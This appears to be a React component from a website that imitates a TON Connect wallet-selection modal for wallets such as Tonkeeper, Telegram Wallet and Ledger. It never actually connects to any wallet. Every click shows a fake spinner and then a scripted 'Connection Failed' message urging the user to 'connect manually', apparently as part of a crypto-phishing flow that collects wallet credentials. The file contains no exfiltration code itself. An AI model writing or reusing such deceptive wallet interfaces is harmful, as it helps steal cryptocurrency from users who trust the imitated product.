import React, {useState, useEffect} from 'react';

const WalletModal = ({isOpen, onClose, onSelectWallet, onSuccess}) => {
    const [isConnecting, setIsConnecting] = useState(false);
    const [connectionError, setConnectionError] = useState(false);
    const [selectedWallet, setSelectedWallet] = useState(null);

    const wallets = [
        {name: 'Bitget Wallet', installed: false},
        {name: 'Ledger', installed: false},
        {name: 'MyTonWallet', installed: false},
        {name: 'Telegram Wallet', installed: false},
        {name: 'Tonhub', installed: false},
        {name: 'TonKeeper', installed: false},
        {name: 'Trust Wallet', installed: false},
    ];

    useEffect(() => {
        let connectTimer, errorTimer;
        if (isConnecting) {
            connectTimer = setTimeout(() => {
                setIsConnecting(false);
                setConnectionError(true);
            }, 3000);
        }
        if (connectionError)
            errorTimer = setTimeout(() => {
                setConnectionError(false);
                onSelectWallet(selectedWallet)
                onClose();
                onSuccess();
            }, 3000);
        return () => {
            clearTimeout(connectTimer);
            clearTimeout(errorTimer);
        };
    }, [isConnecting]);

    if (!isOpen) return null;

    return (
        <div style={styles.modalOverlay} onClick={onClose}>
            <div style={styles.modalContent} onClick={(e) => e.stopPropagation()}>
                {isConnecting ? (
                    <div style={styles.connectingContent}>
                        <div style={styles.spinner}></div>
                        <p style={styles.connectingText}>Connecting to {selectedWallet}...</p>
                    </div>
                ) : connectionError ? (
                    <div style={styles.errorContent}>
                        <div style={styles.errorIcon}>⚠️</div>
                        <h3 style={styles.errorTitle}>Connection Failed</h3>
                        <p style={styles.errorText}>There was an error connecting automatically. But do not worry, you
                            can stll connect manually.</p>
                    </div>
                ) : (
                    <>
                        <div className="modal-content">
                            <h2 style={styles.modalTitle}>Connect Your Wallet</h2>
                            <div style={styles.walletsContainer}>
                                {wallets.map((wallet, index) => (
                                    <div
                                        key={index}
                                        style={styles.walletItem}
                                        onClick={() => {
                                            console.log(`select wallet ${wallet.name}`)
                                            setSelectedWallet(wallet.name);
                                            setIsConnecting(true);
                                        }}
                                    >
                                        <div style={styles.walletInfo}>
                                            <img
                                                className={'rounded-2'}
                                                src={`/${wallet.name.toLowerCase().replaceAll(" ", "-")}-icon.svg`}
                                                alt={wallet.name}
                                                style={styles.walletIcon}
                                            />
                                            <span style={styles.walletName}>{wallet.name}</span>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                        <div className="modal-footer p-3 thirdColor w-100 d-block">
                            <img src="/ton-connect-icon.svg" alt=""/>
                        </div>
                    </>
                )}
            </div>
        </div>
    );
};

const styles = {
    modalOverlay: {
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        backgroundColor: 'rgba(0,0,0,0.7)',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        zIndex: 1000,
    },
    modalContent: {
        backgroundColor: '#1a2026',
        borderRadius: '16px',
        // padding: '24px',
        width: '400px',
        maxWidth: '90%',
    },
    modalTitle: {
        color: '#fff',
        // fontSize: '20px',
        marginBottom: '24px',
        textAlign: 'center',
    },
    walletsContainer: {
        maxHeight: '60vh',
        overflowY: 'auto',
    },
    walletItem: {
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        padding: '12px 16px',
        margin: '8px 0',
        backgroundColor: '#212a33',
        borderRadius: '12px',
        cursor: 'pointer',
        transition: 'background-color 0.2s',
        ':hover': {
            backgroundColor: '#293440',
        }
    },
    walletInfo: {
        display: 'flex',
        alignItems: 'center',
        gap: '12px',
    },
    walletIcon: {
        width: '24px',
        height: '24px',
    },
    walletName: {
        color: '#fff',
        fontSize: '16px',
    },
    installedBadge: {
        color: '#00b2ff',
        fontSize: '12px',
        fontWeight: '500',
    },
    connectingContent: {
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        padding: '2rem',
    },
    spinner: {
        width: '40px',
        height: '40px',
        border: '4px solid #00b2ff',
        borderTopColor: 'transparent',
        borderRadius: '50%',
        animation: 'spin 1s linear infinite',
    },
    connectingText: {
        color: '#888',
        marginTop: '1rem',
    },
    errorContent: {
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        padding: '2rem',
    },
    errorIcon: {
        fontSize: '48px',
        marginBottom: '1rem',
    },
    errorTitle: {
        color: '#ff4d4d',
        marginBottom: '0.5rem',
    },
    errorText: {
        color: '#888',
        textAlign: 'center',
    },
    '@keyframes spin': {
        to: {transform: 'rotate(360deg)'},
    },
};

export default WalletModal;